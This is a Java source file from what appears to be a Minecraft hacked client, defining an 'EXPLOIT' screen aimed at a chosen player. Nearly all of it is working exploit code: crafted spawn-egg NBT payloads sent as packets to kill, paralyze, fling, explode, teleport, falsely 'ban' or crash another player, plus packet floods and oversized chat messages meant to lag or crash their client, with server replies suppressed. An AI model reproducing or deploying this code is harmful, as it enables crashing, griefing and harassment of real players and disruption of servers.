package net.shadow.creativegui;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.mojang.authlib.GameProfile;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.DrawableHelper;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.screen.ingame.InventoryScreen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.client.network.OtherClientPlayerEntity;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.OpenWrittenBookS2CPacket;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.Identifier;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.registry.Registry;
import net.shadow.Shadow;
import net.shadow.event.events.PacketInput;
import net.shadow.font.FontRenderers;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.CreativeUtils;
import net.shadow.utils.PlayerUtils;
import org.apache.commons.io.IOUtils;

import java.awt.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Random;
import java.util.UUID;


public class CreativeGUI extends Screen implements PacketInput {
    protected static final MinecraftClient MC = MinecraftClient.getInstance();
    static boolean alt = false;
    static int blocked = 0;
    private static String lastuser;
    private static OtherClientPlayerEntity plrEntity = new OtherClientPlayerEntity(Shadow.c.world, new GameProfile(UUID.randomUUID(), "Unknown"));
    private static int[] plru = null;
    private static String plrname = "none";
    private static int hx = 0;
    private static int hy = 0;
    TextFieldWidget username;
    TextFieldWidget coords;
    private int j = 0;


    public CreativeGUI(Entity e) {
        super(Text.of("EXPLOIT"));
        if (e != null) {
            plrEntity = (OtherClientPlayerEntity) e;
            plrname = e.getName().asString();
            plru = CreativeUtils.getIntsFromUser(e.getName().toString());
        }
    }

    public static byte[] getBytesFromUUID(UUID uuid) {
        ByteBuffer bb = ByteBuffer.wrap(new byte[16]);
        bb.putLong(uuid.getMostSignificantBits());
        bb.putLong(uuid.getLeastSignificantBits());

        return bb.array();
    }

    @Override
    protected void init() {
        hx = Shadow.c.getWindow().getScaledWidth() / 2;
        hy = Shadow.c.getWindow().getScaledHeight() / 2;
        username = new TextFieldWidget(Shadow.c.textRenderer, hx - 100, hy - 50, 150, 20, Text.of("Username"));
        username.setMaxLength(65535);
        if (lastuser != null) {
            username.setText(lastuser);
        }

        ButtonWidget flingplayer = new ButtonWidget(hx + 55, hy - 50, 50, 20, Text.of("Update"), button -> {
            try {
                UUID u = getrealuuid(PlayerUtils.completeName(username.getText().trim()));
                GameProfile g = new GameProfile(u, PlayerUtils.completeName(username.getText().trim()));
                plrEntity = new OtherClientPlayerEntity(Shadow.c.world, g);
                plrEntity.setCustomName(Text.of(username.getText()));
                plrEntity.setCustomNameVisible(true);
                plrname = PlayerUtils.completeName(username.getText());
                plru = CreativeUtils.getIntsFromUser(PlayerUtils.completeName(username.getText()));
                username.setText(plrname);
                if (plru == null) {
                    throw new Exception();
                }
            } catch (Exception e) {
                ChatUtils.message("Not a Player");
                e.printStackTrace();
            }
        });

        if (Shadow.c.player.getAbilities().creativeMode) {
            ButtonWidget banButton = new ButtonWidget(hx - 100, hy - 25, 100, 20, Text.of("Ban"), button -> new Thread(() -> {
                try {
                    Item item = Registry.ITEM.get(new Identifier("guardian_spawn_egg"));
                    ItemStack stack = new ItemStack(item, 1);
                    ItemStack before = Shadow.c.player.getMainHandStack();
                    NbtCompound tag = StringNbtReader.parse("{id:\"minecraft:armor_stand\",EntityTag:{UUID:[I;" + plru[0] + "," + plru[1] + "," + plru[2] + "," + plru[3] + "],NoGravity:1b,Small:1b}}");
                    stack.setNbt(tag);
                    Thread.sleep(100);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, (BlockHitResult) Shadow.c.crosshairTarget));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, before));
                    if (PlayerUtils.isOnline(plrname)) {
                        ChatUtils.message("You cannot ban someone who is online!");
                    } else {
                        ChatUtils.message("Banned Player " + plrname);
                    }
                } catch (Exception ignored) {
                }
            }).start());

            ButtonWidget floodInv = new ButtonWidget(hx + 3, hy - 25, 100, 20, Text.of("Flood Inv"), button -> {
            });

            ButtonWidget paralyze = new ButtonWidget(hx - 100, hy, 100, 20, Text.of("Paralyze"), button -> new Thread(() -> {
                try {
                    Item item = Registry.ITEM.get(new Identifier("guardian_spawn_egg"));
                    ItemStack stack = new ItemStack(item, 1);
                    ItemStack before = Shadow.c.player.getMainHandStack();
                    BlockPos playercoords = getPlayerCoords(plrname);
                    NbtCompound tag = StringNbtReader.parse("{EntityTag:{id:\"minecraft:area_effect_cloud\",Particle:\"block air\",Radius:4.5f,Pos:[" + playercoords.getX() + ".0d," + (playercoords.getY() + 1) + ".0d," + playercoords.getZ() + ".0d,],RadiusPerTick:0f,RadiusOnUse:0f,Duration:40,DurationOnUse:-999f,Age:0,WaitTime:0,Effects:[{Id:2b,Amplifier:125b,Duration:1980,ShowParticles:0b},{Id:8b,Amplifier:125b,Duration:1980,ShowParticles:0b}]}}");
                    stack.setNbt(tag);
                    Thread.sleep(100);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, (BlockHitResult) Shadow.c.crosshairTarget));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, before));
                    ChatUtils.message("Froze Player " + plrname);
                } catch (Exception e) {
                    ChatUtils.message("No Entity Was Found");
                }
            }).start());

            ButtonWidget renderKick = new ButtonWidget(hx + 3, hy, 100, 20, Text.of("Find"), button -> new Thread(() -> {
                try {
                    BlockPos playercoords = getPlayerCoords(plrname);
                    ChatUtils.message(plrname + " is at " + playercoords.getX() + ", " + playercoords.getY() + ", " + playercoords.getZ() + " [Copied]");
                    Shadow.c.keyboard.setClipboard(playercoords.getX() + " " + playercoords.getY() + " " + playercoords.getZ());
                } catch (Exception e) {
                    ChatUtils.message("No Entity Was Found");
                }
            }).start());

            ButtonWidget kill = new ButtonWidget(hx - 100, hy + 25, 100, 20, Text.of("Kill"), button -> new Thread(() -> {
                try {
                    Item item = Registry.ITEM.get(new Identifier("guardian_spawn_egg"));
                    ItemStack stack = new ItemStack(item, 1);
                    ItemStack before = Shadow.c.player.getMainHandStack();
                    BlockPos playercoords = getPlayerCoords(plrname);
                    NbtCompound tag = StringNbtReader.parse("{EntityTag:{id:\"minecraft:area_effect_cloud\",Particle:\"block air\",Radius:4.5f,Pos:[" + playercoords.getX() + ".0d," + (playercoords.getY() + 1) + ".0d," + playercoords.getZ() + ".0d,],RadiusPerTick:0f,RadiusOnUse:0f,Duration:40,DurationOnUse:-999f,Age:0,WaitTime:0,Effects:[{Id:6b,Amplifier:125b,Duration:1980,ShowParticles:0b}]}}");
                    stack.setNbt(tag);
                    Thread.sleep(100);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, (BlockHitResult) Shadow.c.crosshairTarget));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, before));
                    ChatUtils.message("Killed Player " + plrname);
                } catch (Exception e) {
                    ChatUtils.message("No Entity Was Found");
                }
            }).start());

            ButtonWidget fling = new ButtonWidget(hx + 3, hy + 25, 100, 20, Text.of("Fling"), button -> new Thread(() -> {
                try {
                    Item item = Registry.ITEM.get(new Identifier("guardian_spawn_egg"));
                    ItemStack stack = new ItemStack(item, 1);
                    ItemStack before = Shadow.c.player.getMainHandStack();
                    BlockPos playercoords = getPlayerCoords(plrname);
                    NbtCompound tag = StringNbtReader.parse("{EntityTag:{id:\"minecraft:area_effect_cloud\",Particle:\"block air\",Radius:4.5f,Pos:[" + playercoords.getX() + ".0d," + (playercoords.getY() + 1) + ".0d," + playercoords.getZ() + ".0d,],RadiusPerTick:0f,RadiusOnUse:0f,Duration:40,DurationOnUse:-999f,Age:0,WaitTime:0,Effects:[{Id:25b,Amplifier:125b,Duration:1980,ShowParticles:0b}]}}");
                    stack.setNbt(tag);
                    Thread.sleep(100);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, (BlockHitResult) Shadow.c.crosshairTarget));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, before));
                    ChatUtils.message("Flung Player " + plrname);
                } catch (Exception e) {
                    ChatUtils.message("No Entity Was Found");
                }
            }).start());

            ButtonWidget nuke = new ButtonWidget(hx - 100, hy + 50, 100, 20, Text.of("Nuke"), button -> new Thread(() -> {
                try {
                    Item item = Registry.ITEM.get(new Identifier("guardian_spawn_egg"));
                    ItemStack stack = new ItemStack(item, 1);
                    ItemStack before = Shadow.c.player.getMainHandStack();
                    BlockPos playercoords = getPlayerCoords(plrname);
                    NbtCompound tag = StringNbtReader.parse("{EntityTag:{id:\"minecraft:fireball\",ExplosionPower:127b,power:[0.0,-1.0,0.0],Pos:[" + playercoords.getX() + ".0d, " + playercoords.getY() + ".0d, " + playercoords.getZ() + ".0d]}}");
                    stack.setNbt(tag);
                    Thread.sleep(100);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, (BlockHitResult) Shadow.c.crosshairTarget));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, before));
                    ChatUtils.message("Nuked Player " + plrname);
                } catch (Exception e) {
                    ChatUtils.message("No Entity Was Found");
                }
            }).start());

            ButtonWidget tpohere = new ButtonWidget(hx + 3, hy + 50, 100, 20, Text.of("Tp here"), button -> new Thread(() -> {
                try {
                    Item item = Registry.ITEM.get(new Identifier("guardian_spawn_egg"));
                    ItemStack stack = new ItemStack(item, 1);
                    ItemStack before = Shadow.c.player.getMainHandStack();
                    NbtCompound tag = StringNbtReader.parse("{EntityTag:{id:\"minecraft:ender_pearl\",Owner:[I;" + plru[0] + "," + plru[1] + "," + plru[2] + "," + plru[3] + "],Motion:[0.0,-3.0,0.0]}}");
                    stack.setNbt(tag);
                    Thread.sleep(100);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, (BlockHitResult) Shadow.c.crosshairTarget));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, before));
                    ChatUtils.message("Teleported Player " + plrname);
                } catch (Exception e) {
                    ChatUtils.message("No Entity Was Found");
                }
            }).start());

            ButtonWidget tp2p = new ButtonWidget(hx - 100, hy + 75, 100, 20, Text.of("Tp there"), button -> new Thread(() -> {
                try {
                    Item item = Registry.ITEM.get(new Identifier("guardian_spawn_egg"));
                    ItemStack stack = new ItemStack(item, 1);
                    ItemStack before = Shadow.c.player.getMainHandStack();
                    BlockPos playercoords = getPlayerCoords(plrname);
                    int[] temp = CreativeUtils.getIntsFromUUID(Shadow.c.player.getGameProfile().getId().toString());
                    NbtCompound tag = StringNbtReader.parse("{EntityTag:{Pos:[" + playercoords.getX() + ".0d, " + playercoords.getY() + ".0d, " + playercoords.getZ() + ".0d],id:\"minecraft:ender_pearl\",Owner:[I;" + temp[0] + "," + temp[1] + "," + temp[2] + "," + temp[3] + "],Motion:[0.0,-3.0,0.0]}}");
                    stack.setNbt(tag);
                    Thread.sleep(100);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, (BlockHitResult) Shadow.c.crosshairTarget));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, before));
                    ChatUtils.message("Teleported Player " + plrname);
                } catch (Exception e) {
                    ChatUtils.message("No Entity Was Found");
                }
            }).start());

            ButtonWidget crash = new ButtonWidget(hx + 3, hy + 75, 100, 20, Text.of("Crash"), button -> new Thread(() -> {
                try {
                    Item item = Registry.ITEM.get(new Identifier("guardian_spawn_egg"));
                    ItemStack stack = new ItemStack(item, 1);
                    ItemStack before = Shadow.c.player.getMainHandStack();
                    BlockPos playercoords = getPlayerCoords(plrname);
                    NbtCompound tag = StringNbtReader.parse("{EntityTag:{Pos:[" + playercoords.getX() + "," + playercoords.getY() + 2 + "," + playercoords.getZ() + "],Item:{Count:1b,id:\"minecraft:cake\",tag:{display:{Name:'{\"text\":\"poof\",\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"id\":\"f97c0d7b-6413-4558-a409-88f09a8f9adb[][][][][][][]][][][\",\"type\":\"minecraft:player\"}}}'}}},id:\"minecraft:item\"}}");
                    stack.setNbt(tag);
                    Thread.sleep(100);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, (BlockHitResult) Shadow.c.crosshairTarget));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, before));
                    ChatUtils.message("Crashed Player " + plrname);
                } catch (Exception e) {
                    ChatUtils.message("No Entity Was Found");
                }
            }).start());

            ButtonWidget gdata = new ButtonWidget(hx - 100, hy + 100, 100, 20, Text.of("Spigot Ban"), button -> new Thread(() -> {
                try {
                    Item item = Registry.ITEM.get(new Identifier("guardian_spawn_egg"));
                    ItemStack stack = new ItemStack(item, 1);
                    ItemStack before = Shadow.c.player.getMainHandStack();
                    BlockPos playercoords = getPlayerCoords(plrname);
                    int[] temp = CreativeUtils.getIntsFromUUID(Shadow.c.player.getGameProfile().getId().toString());
                    NbtCompound tag = StringNbtReader.parse("{EntityTag:{id:\"minecraft:trident\",pickup:1b,Owner:[I;" + plru[0] + "," + plru[1] + "," + plru[2] + "," + plru[3] + "],player:1b,Trident:{id:\"minecraft:player_head\",Count:1b,tag:{Enchantments:[{id:\"minecraft:loyalty\",lvl:3s}],SkullOwner:\" \"}}}}");
                    stack.setNbt(tag);
                    Thread.sleep(100);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, (BlockHitResult) Shadow.c.crosshairTarget));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, before));
                    ChatUtils.message("Teleported Player " + plrname);
                } catch (Exception e) {
                    ChatUtils.message("No Entity Was Found");
                }
            }).start());

            ButtonWidget givehand = new ButtonWidget(hx + 3, hy + 100, 100, 20, Text.of("Give Hand"), button -> new Thread(() -> {
                try {
                    Item item = Registry.ITEM.get(new Identifier("guardian_spawn_egg"));
                    ItemStack stack = new ItemStack(item, 1);
                    ItemStack before = Shadow.c.player.getMainHandStack();
                    BlockPos playercoords = getPlayerCoords(plrname);
                    int[] temp = CreativeUtils.getIntsFromUUID(Shadow.c.player.getGameProfile().getId().toString());
                    String name = getItemNameFromStack(before);
                    NbtCompound tag = StringNbtReader.parse("{EntityTag:{id:\"minecraft:trident\",pickup:1b,Owner:[I;" + plru[0] + "," + plru[1] + "," + plru[2] + "," + plru[3] + "],player:1b,Trident:{id:\"minecraft:" + name + "\",Count:1b,tag:" + before.getNbt().asString() + "}}}");
                    stack.setNbt(tag);
                    Thread.sleep(100);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, (BlockHitResult) Shadow.c.crosshairTarget));
                    Thread.sleep(50);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, before));
                    ChatUtils.message("Teleported Player " + plrname);
                } catch (Exception e) {
                    ChatUtils.message("No Entity Was Found");
                }
            }).start());


            this.addDrawableChild(banButton);
            this.addDrawableChild(floodInv);
            this.addDrawableChild(paralyze);
            this.addDrawableChild(renderKick);
            this.addDrawableChild(kill);
            this.addDrawableChild(fling);
            this.addDrawableChild(nuke);
            this.addDrawableChild(tpohere);
            this.addDrawableChild(tp2p);
            this.addDrawableChild(crash);
            this.addDrawableChild(gdata);
            this.addDrawableChild(givehand);
        } else {
            ButtonWidget tfreeze = new ButtonWidget(hx - 100, hy - 25, 200, 20, Text.of("Freeze"), button -> {
                Entity player = PlayerUtils.getEntity(plrname);
                if (player == null) return;
                if (player.distanceTo(Shadow.c.player) > 7) {
                    ChatUtils.message("Cannot Freeze when that far away!");
                    return;
                }
                for (int i = 0; i < 300; i++) {
                    Shadow.c.player.networkHandler.sendPacket(PlayerInteractEntityC2SPacket.attack(player, false));
                }
            });

            ButtonWidget lag = new ButtonWidget(hx - 100, hy, 200, 20, Text.of("Lag"), button -> {
                String[] chars = new String[]{"Ͷ", "ͷ"};
                Random r = new Random();
                StringBuilder payload = new StringBuilder();
                for (int i = 0; i < 4000; i++) {
                    payload.append(chars[r.nextInt(chars.length - 1)]);
                }
                String x = "/msg " + plrname + " &l&a&k" + payload;
                Shadow.c.player.networkHandler.sendPacket(new ChatMessageC2SPacket(x));
                Shadow.getEventSystem().add(PacketInput.class, this);
                blocked = 0;
                alt = true;
            });

            ButtonWidget forcefind = new ButtonWidget(hx - 100, hy + 25, 200, 20, Text.of("ForceFind"), button -> {

            });

            ButtonWidget grabuuid = new ButtonWidget(hx - 100, hy + 50, 200, 20, Text.of("ClearChat"), button -> {
                String payload = "&b ".repeat(826);
                Shadow.c.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/msg " + plrname + " " + payload));
                Shadow.getEventSystem().add(PacketInput.class, this);
                blocked = 0;
                alt = true;
            });


            this.addDrawableChild(lag);
            this.addDrawableChild(tfreeze);
            this.addDrawableChild(forcefind);
            this.addDrawableChild(grabuuid);
        }
        this.addDrawableChild(flingplayer);
        super.init();
    }

    @Override
    public void render(MatrixStack matrices, int mouseX, int mouseY, float delta) {
        hx = Shadow.c.getWindow().getScaledWidth() / 2;
        hy = Shadow.c.getWindow().getScaledHeight() / 2;
        DrawableHelper.fill(matrices, 0, 0, width, height, new Color(0, 0, 0, 175).getRGB());
        username.render(matrices, mouseX, mouseY, delta);
        super.render(matrices, mouseX, mouseY, delta);
        InventoryScreen.drawEntity(hx, hy - 80, 50, j, 0, plrEntity);
        FontRenderers.getRenderer().drawString(matrices, plrname, hx - (FontRenderers.getRenderer().getStringWidth(plrname) / 2), hy - 70, 0xFFFFFF);
        j++;
        if (j > 100) {
            j = -100;
        }
    }

    @Override
    public boolean charTyped(char chr, int keyCode) {
        username.charTyped(chr, keyCode);
        lastuser = username.getText();
        return false;
    }

    @Override
    public boolean keyReleased(int keyCode, int scanCode, int modifiers) {
        username.keyReleased(keyCode, scanCode, modifiers);
        return false;
    }

    @Override
    public boolean keyPressed(int keyCode, int scanCode, int modifiers) {
        username.keyPressed(keyCode, scanCode, modifiers);
        return super.keyPressed(keyCode, scanCode, modifiers);
    }

    @Override
    public boolean mouseClicked(double mouseX, double mouseY, int button) {
        username.mouseClicked(mouseX, mouseY, button);
        return super.mouseClicked(mouseX, mouseY, button);
    }

    private String getUUID(String username) throws IOException {
        URL profileURL =
                URI.create("https://api.mojang.com/users/profiles/minecraft/")
                        .resolve(URLEncoder.encode(username, StandardCharsets.UTF_8)).toURL();

        try (InputStream profileInputStream = profileURL.openStream()) {
            // {"name":"<username>","id":"<UUID>"}

            JsonObject profileJson = new Gson().fromJson(
                    IOUtils.toString(profileInputStream, StandardCharsets.UTF_8),
                    JsonObject.class);
            return profileJson.get("id").getAsString();
        }
    }

    private UUID getrealuuid(String username) throws IOException {
        String s = getUUID(username);
        String p = s.replaceFirst("(\\p{XDigit}{8})(\\p{XDigit}{4})(\\p{XDigit}{4})(\\p{XDigit}{4})(\\p{XDigit}+)", "$1-$2-$3-$4-$5");
        return UUID.fromString(p);
    }

    private String getItemNameFromStack(ItemStack hstack) {
        String hs = hstack.getItem().getTranslationKey();
        hs = hs.replace("minecraft.", "").replace("block.", "").replace("item.", "");
        return hs;
    }

    private BlockPos getPlayerCoords(String name) {
        if (PlayerUtils.getEntity(name) != null) {
            Entity e = PlayerUtils.getEntity(name);
            return e.getBlockPos();
        } else {
            Shadow.getEventSystem().add(PacketInput.class, this);
            alt = false;
            return PlayerUtils.locate(name);
        }
    }

    @Override
    public void onReceivedPacket(PacketInputEvent event) {
        if (event.getPacket() instanceof OpenWrittenBookS2CPacket && !alt) {
            event.cancel();
            Shadow.getEventSystem().remove(PacketInput.class, this);
        }
        if (event.getPacket() instanceof GameMessageS2CPacket && alt) {
            blocked++;
            event.cancel();
            if (blocked > 2) {
                blocked = 0;
                Shadow.getEventSystem().remove(PacketInput.class, this);
                alt = false;
            }
        }
    }
}